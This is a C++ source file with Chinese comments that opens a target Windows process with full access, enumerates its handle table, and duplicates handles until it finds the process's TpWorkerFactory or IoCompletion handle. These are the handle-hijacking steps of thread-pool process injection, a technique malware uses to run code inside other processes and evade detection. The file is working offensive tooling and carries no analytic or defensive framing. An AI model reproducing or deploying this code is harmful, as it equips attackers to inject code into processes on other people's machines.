// hijackHandle.cpp

#include "pch.h"
#include "HijackHandle.h"
#include <stdio.h>

// =========================
// Close Handle
// =========================
NTSTATUS MyCloseHandle(HANDLE handle)
{
    PFN_NTClose NtClose =
        (PFN_NTClose)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtClose"
        );

    if (!NtClose)
    {
        printf("NtClose函数地址获取失败\n");
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS status = NtClose(handle);

    if (!NT_SUCCESS(status))
    {
        printf("关闭句柄失败: 0x%08X\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}



// =========================
// Open Process
// =========================
NTSTATUS MyOpenProcess(PHANDLE phProcess,CLIENT_ID clientId,OBJECT_ATTRIBUTES objAttr)
{
    PFN_NTOpenProcess NtOpenProcess =
        (PFN_NTOpenProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtOpenProcess"
        );

    if (!NtOpenProcess)
    {
        printf("获取NtOpenProcess失败\n");
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS status = NtOpenProcess(
        phProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &clientId
    );

    if (!NT_SUCCESS(status))
    {
        printf("打开进程失败: 0x%08X\n", status);
        return status;
    }

    printf("成功打开进程，句柄: 0x%p\n", *phProcess);

    return STATUS_SUCCESS;
}



// =========================
// Query Handle Table
// =========================
NTSTATUS MyQueryInformationProcess(
    HANDLE hProcess,
    ULONG ProcessInformationClass,
    PROCESS_HANDLE_SNAPSHOT_INFORMATION** pHandleTable
)
{
    PFN_NTQueryInformationProcess NtQueryInformationProcess =
        (PFN_NTQueryInformationProcess)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQueryInformationProcess"
        );

    if (!NtQueryInformationProcess)
    {
        printf("获取NtQueryInformationProcess失败\n");
        return STATUS_UNSUCCESSFUL;
    }

    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        (PROCESSINFOCLASS)ProcessInformationClass,
        NULL,
        0,
        &returnLength
    );

    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        printf("获取缓冲区大小失败: 0x%08X\n", status);
        return status;
    }
    do
    {


        *pHandleTable =
            (PROCESS_HANDLE_SNAPSHOT_INFORMATION*)malloc(returnLength);

        if (!*pHandleTable)
        {
            printf("malloc失败\n");
            return STATUS_NO_MEMORY;
        }

        ZeroMemory(*pHandleTable, returnLength);

        status = NtQueryInformationProcess(
            hProcess,
            (PROCESSINFOCLASS)ProcessInformationClass,
            *pHandleTable,
            returnLength,
            &returnLength
        );
    } while (status == STATUS_INFO_LENGTH_MISMATCH);



    if (!NT_SUCCESS(status))
    {
        printf("获取句柄表失败: 0x%08X\n", status);

        free(*pHandleTable);
        *pHandleTable = NULL;

        return status;
    }

    printf("获取句柄表成功\n");

    return STATUS_SUCCESS;
}



// =========================
// Duplicate Handle
// =========================
NTSTATUS MyDuplicateHandle(
    HANDLE hSourceProcessHandle,
    HANDLE hSourceHandle,
    PHANDLE phTargetHandle
)
{
    PFN_NTDuplicateObject NtDuplicateObject =
        (PFN_NTDuplicateObject)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtDuplicateObject"
        );

    if (!NtDuplicateObject)
    {
        printf("获取NtDuplicateObject失败\n");
        return STATUS_UNSUCCESSFUL;
    }

    NTSTATUS status = NtDuplicateObject(
        hSourceProcessHandle,
        hSourceHandle,
        GetCurrentProcess(),
        phTargetHandle,
        0,
        0,
        DUPLICATE_SAME_ACCESS
    );

    if (!NT_SUCCESS(status))
    {
        printf("复制句柄失败: 0x%08X\n", status);
        return status;
    }

    printf("复制句柄成功: 0x%p\n", *phTargetHandle);

    return STATUS_SUCCESS;
}



// =========================
// Query Object
// =========================
NTSTATUS MyQueryObject(
    HANDLE hObject,
    ULONG ObjectInformationClass,
    PUBLIC_OBJECT_TYPE_INFORMATION** pObjectInfo
)
{
    PFN_NTQueryObject NtQueryObject =
        (PFN_NTQueryObject)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQueryObject"
        );

    if (!NtQueryObject)
    {
        printf("获取NtQueryObject失败\n");
        return STATUS_UNSUCCESSFUL;
    }

    ULONG returnLength = 0;

    NTSTATUS status = NtQueryObject(
        hObject,
        (OBJECT_INFORMATION_CLASS)ObjectInformationClass,
        NULL,
        0,
        &returnLength
    );

    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        printf("获取Object缓冲区大小失败: 0x%08X\n", status);
        return status;
    }

    *pObjectInfo =
        (PUBLIC_OBJECT_TYPE_INFORMATION*)malloc(returnLength);

    if (!*pObjectInfo)
    {
        printf("malloc失败\n");
        return STATUS_NO_MEMORY;
    }

    ZeroMemory(*pObjectInfo, returnLength);

    status = NtQueryObject(
        hObject,
        (OBJECT_INFORMATION_CLASS)ObjectInformationClass,
        *pObjectInfo,
        returnLength,
        &returnLength
    );

    if (!NT_SUCCESS(status))
    {
        printf("获取对象信息失败: 0x%08X\n", status);

        free(*pObjectInfo);
        *pObjectInfo = NULL;

        return status;
    }

    return STATUS_SUCCESS;
}



// =========================
// Get PID By Name
// =========================
DWORD getPIDByName(const wchar_t* TargetName)
{
    HANDLE hSnapshot =
        CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS,
            0
        );

    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot失败\n");
        return 0;
    }

    PROCESSENTRY32W pe32;
    ZeroMemory(&pe32, sizeof(pe32));

    pe32.dwSize = sizeof(pe32);

    if (!Process32FirstW(hSnapshot, &pe32))
    {
        CloseHandle(hSnapshot);

        printf("Process32FirstW失败\n");

        return 0;
    }

    do
    {
        if (_wcsicmp(pe32.szExeFile, TargetName) == 0)
        {
            DWORD pid = pe32.th32ProcessID;

            CloseHandle(hSnapshot);

            return pid;
        }

    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);

    printf("未找到目标进程: %ws\n", TargetName);

    return 0;
}



// =========================
// Hijack TpWorkerFactory
// =========================
// 修改后的 Hijack_TP_WORK_HANDLE
HANDLE Hijack_TP_WORK_HANDLE(PHANDLE phTargetProcess, DWORD pid)
{
    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    HANDLE hTargetProcess = NULL;
    NTSTATUS status = MyOpenProcess(&hTargetProcess, clientId, objAttr);
    if (!NT_SUCCESS(status) || !hTargetProcess)
    {
        printf("[-] Open target process failed\n");
        return NULL;
    }

    *phTargetProcess = hTargetProcess;   // 传给调用者

    // 查询句柄表...
    PROCESS_HANDLE_SNAPSHOT_INFORMATION* pHandleTable = NULL;
    status = MyQueryInformationProcess(hTargetProcess, ProcessHandleSnapshotInformation, &pHandleTable);
    if (!NT_SUCCESS(status))
    {
        // 这里不要关闭 hTargetProcess
        return NULL;
    }

    for (ULONG_PTR i = 0; i < pHandleTable->NumberOfHandles; i++)
    {
        HANDLE hSourceHandle = pHandleTable->Handles[i].HandleValue;
        HANDLE hDuplicatedHandle = NULL;

        status = MyDuplicateHandle(hTargetProcess, hSourceHandle, &hDuplicatedHandle);
        if (!NT_SUCCESS(status)) continue;

        // 查询类型...
        PUBLIC_OBJECT_TYPE_INFORMATION* pInfo = NULL;
        if (NT_SUCCESS(MyQueryObject(hDuplicatedHandle, ObjectTypeInformation, &pInfo)))
        {
            if (_wcsnicmp(pInfo->TypeName.Buffer, L"TpWorkerFactory", pInfo->TypeName.Length / sizeof(WCHAR)) == 0)
            {
                printf("[+] 找到 TpWorkerFactory 句柄!\n");
                free(pInfo);
                free(pHandleTable);
                // 注意：这里不要关闭 hTargetProcess！
                return hDuplicatedHandle;
            }
            free(pInfo);
        }
        MyCloseHandle(hDuplicatedHandle);
    }

    free(pHandleTable);
    // 同样不要在这里关闭 hTargetProcess
    printf("[-] 未找到 TpWorkerFactory\n");
    return NULL;
}
// 劫持句柄
HANDLE Hijack_TP_IO_HANDLE(PHANDLE phTargetProcess, DWORD pid)
{
    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(
        &objAttr,
        NULL,
        0,
        NULL,
        NULL
    );
    HANDLE hTargetProcess = NULL;
    NTSTATUS status = MyOpenProcess(&hTargetProcess, clientId, objAttr);
    if (!NT_SUCCESS(status) || !hTargetProcess)
    {
        printf("[-] Open target process failed\n");
        return NULL;
    }

    *phTargetProcess = hTargetProcess;   // 传给调用者

    // 查询句柄表...
    PROCESS_HANDLE_SNAPSHOT_INFORMATION* pHandleTable = NULL;
    status = MyQueryInformationProcess(hTargetProcess, ProcessHandleSnapshotInformation, &pHandleTable);
    if (!NT_SUCCESS(status))
    {
        // 这里不要关闭 hTargetProcess
        return NULL;
    }

    for (ULONG_PTR i = 0; i < pHandleTable->NumberOfHandles; i++)
    {
        HANDLE hSourceHandle = pHandleTable->Handles[i].HandleValue;
        HANDLE hDuplicatedHandle = NULL;

        status = MyDuplicateHandle(hTargetProcess, hSourceHandle, &hDuplicatedHandle);
        if (!NT_SUCCESS(status)) continue;

        // 查询类型...
        PUBLIC_OBJECT_TYPE_INFORMATION* pInfo = NULL;
        if (NT_SUCCESS(MyQueryObject(hDuplicatedHandle, ObjectTypeInformation, &pInfo)))
        {
            if (_wcsnicmp(pInfo->TypeName.Buffer, L"IoCompletion", pInfo->TypeName.Length / sizeof(WCHAR)) == 0)
            {
                printf("找到 IoCompletion 句柄!\n");
                free(pInfo);
                free(pHandleTable);
                // 注意：这里不要关闭 hTargetProcess！
                return hDuplicatedHandle;
            }
            free(pInfo);
        }
        MyCloseHandle(hDuplicatedHandle);
    }

    free(pHandleTable);
    // 同样不要在这里关闭 hTargetProcess
    printf("未找到 IoCompletion\n");
    return NULL;
}